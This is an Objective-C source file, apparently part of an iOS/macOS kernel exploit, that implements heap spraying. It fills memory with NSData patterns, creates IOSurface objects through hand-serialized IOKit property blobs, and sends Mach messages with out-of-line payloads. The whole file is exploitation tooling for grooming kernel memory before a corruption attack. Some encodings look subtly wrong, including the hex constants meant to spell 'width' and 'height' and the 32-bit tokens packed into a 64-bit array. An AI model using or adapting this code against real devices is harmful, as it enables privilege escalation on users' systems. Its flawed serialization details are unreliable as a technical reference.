// HeapSpray.m
#import "HeapSpray.h"
#import <IOSurface/IOSurfaceRef.h>
#import <IOKit/IOKitLib.h>

// IOSurface相关定义
#define kOSSerializeDictionary   0x01000000U
#define kOSSerializeArray        0x02000000U
#define kOSSerializeSet          0x03000000U
#define kOSSerializeNumber       0x04000000U
#define kOSSerializeSymbol       0x08000000U
#define kOSSerializeString       0x09000000U
#define kOSSerializeData         0x0a000000U
#define kOSSerializeBoolean      0x0b000000U
#define kOSSerializeObject       0x0c000000U
#define kOSSerializeEndCollection 0x80000000U
#define kOSSerializeMagic        0x000000d3U

// 全局堆喷对象
static NSMutableArray *g_spray_objects = nil;
static NSMutableArray *g_mach_ports = nil;

// 基本堆喷射 - 使用标准Objective-C对象
bool heap_spray(size_t size, size_t count, uint64_t pattern) {
    NSLog(@"[*] 执行基本堆喷射: 大小=%zu, 数量=%zu, 模式=0x%llx", size, count, pattern);
    
    if (g_spray_objects == nil) {
        g_spray_objects = [[NSMutableArray alloc] init];
    }
    
    @try {
        // 调整大小确保是8的倍数
        size = (size + 7) & ~7;
        
        for (size_t i = 0; i < count; i++) {
            // 创建NSData对象填充特定模式
            NSMutableData *data = [NSMutableData dataWithLength:size];
            void *buffer = [data mutableBytes];
            
            // 用指定模式填充
            for (size_t j = 0; j < size; j += 8) {
                *((uint64_t*)(buffer + j)) = pattern + j;
            }
            
            // 保存在全局数组中防止被释放
            [g_spray_objects addObject:data];
        }
        
        NSLog(@"[+] 堆喷完成: 当前已分配 %lu 个对象", (unsigned long)[g_spray_objects count]);
        return true;
    } @catch (NSException *e) {
        NSLog(@"[-] 堆喷射出现异常: %@", e);
        return false;
    }
}

// 目标结构堆喷射 - 针对特定大小和结构
bool heap_spray_target_structures(size_t target_size, size_t count) {
    NSLog(@"[*] 执行定向堆喷射: 大小=%zu, 数量=%zu", target_size, count);
    
    // 确保内存大小合理
    if (target_size > 0x10000 || target_size == 0) {
        NSLog(@"[-] 无效的堆喷射大小");
        return false;
    }
    
    // 使用不同方式的堆喷射，提高成功率
    bool spray1 = heap_spray(target_size, count, 0x4141414141414141);
    
    // 第二种方法：使用IOSurface API进行堆喷射
    bool spray2 = spray_iosurface_objects(target_size, count/2);
    
    // 第三种方法：使用Mach消息进行堆喷射
    bool spray3 = spray_mach_messages(target_size, count/2);
    
    return spray1 || spray2 || spray3;
}

// IOSurface堆喷射
bool spray_iosurface_objects(size_t size, size_t count) {
    NSLog(@"[*] 使用IOSurface进行堆喷射: 大小=%zu, 数量=%zu", size, count);
    
    // 获取IOKit服务
    mach_port_t master = IOKitGetMainPort();
    if (master == MACH_PORT_NULL) return false;
    
    io_service_t service = IOServiceGetMatchingService(master, 
                          IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL) return false;
    
    io_connect_t connect = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) return false;
    
    // 创建一系列IOSurface对象
    for (size_t i = 0; i < count; i++) {
        // 创建属性字典
        uint32_t dict_size = 1024;
        uint64_t *properties = calloc(1, dict_size);
        if (!properties) continue;
        
        // 设置基本属性
        uint32_t idx = 0;
        properties[idx++] = kOSSerializeMagic;
        properties[idx++] = kOSSerializeDictionary | kOSSerializeEndCollection | 3;
        
        // 宽度属性
        properties[idx++] = kOSSerializeSymbol | 6;
        properties[idx++] = 0x68746469770; // "width"
        properties[idx++] = kOSSerializeNumber | 32;
        properties[idx++] = 0x1000; // 宽度值
        
        // 高度属性
        properties[idx++] = kOSSerializeSymbol | 7;
        properties[idx++] = 0x7468676965680; // "height"
        properties[idx++] = kOSSerializeNumber | 32;
        properties[idx++] = 0x1000; // 高度值
        
        // 大小属性
        properties[idx++] = kOSSerializeSymbol | 5;
        properties[idx++] = 0x657a6973; // "size"
        properties[idx++] = kOSSerializeNumber | 32; 
        properties[idx++] = size; // 目标大小
        
        // 创建IOSurface
        kr = IOConnectCallMethod(connect, 0, NULL, 0, properties, dict_size, NULL, NULL, NULL, NULL);
        free(properties);
        
        if (kr != KERN_SUCCESS) {
            NSLog(@"[-] IOSurface创建失败: %d", kr);
        }
    }
    
    IOServiceClose(connect);
    return true;
}

// Mach消息堆喷射
bool spray_mach_messages(size_t size, size_t count) {
    NSLog(@"[*] 使用Mach消息进行堆喷射: 大小=%zu, 数量=%zu", size, count);
    
    // 确保大小适合Mach消息
    if (size > 0x4000) size = 0x4000;
    if (size < 0x100) size = 0x100;
    
    // 初始化全局端口数组
    if (g_mach_ports == nil) {
        g_mach_ports = [[NSMutableArray alloc] init];
    }
    
    // 创建消息内容
    void *data = malloc(size);
    if (!data) return false;
    
    // 填充特定模式
    for (size_t i = 0; i < size/8; i++) {
        ((uint64_t*)data)[i] = 0x4242424242424242 + i;
    }
    
    // 创建并存储端口
    for (size_t i = 0; i < count; i++) {
        mach_port_t port = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
        if (kr != KERN_SUCCESS) {
            NSLog(@"[-] 端口分配失败: %d", kr);
            continue;
        }
        
        kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
        if (kr != KERN_SUCCESS) {
            NSLog(@"[-] 端口权限设置失败: %d", kr);
            mach_port_destroy(mach_task_self(), port);
            continue;
        }
        
        // 添加到全局数组
        [g_mach_ports addObject:@(port)];
        
        // 创建消息
        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t desc;
            uint8_t padding[512];
        } msg;
        
        memset(&msg, 0, sizeof(msg));
        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.header.msgh_id = 0x41414141;
        
        msg.body.msgh_descriptor_count = 1;
        
        msg.desc.address = data;
        msg.desc.size = size;
        msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;
        msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
        msg.desc.deallocate = 0;
        
        kr = mach_msg(&msg.header, MACH_SEND_MSG, msg.header.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            NSLog(@"[-] 消息发送失败: %d", kr);
        }
    }
    
    free(data);
    return true;
}

// 清理堆喷资源
void cleanup_heap_spray(void) {
    if (g_spray_objects != nil) {
        [g_spray_objects removeAllObjects];
    }
    
    if (g_mach_ports != nil) {
        for (NSNumber *portNum in g_mach_ports) {
            mach_port_t port = [portNum unsignedIntValue];
            if (port != MACH_PORT_NULL) {
                mach_port_destroy(mach_task_self(), port);
            }
        }
        [g_mach_ports removeAllObjects];
    }
}
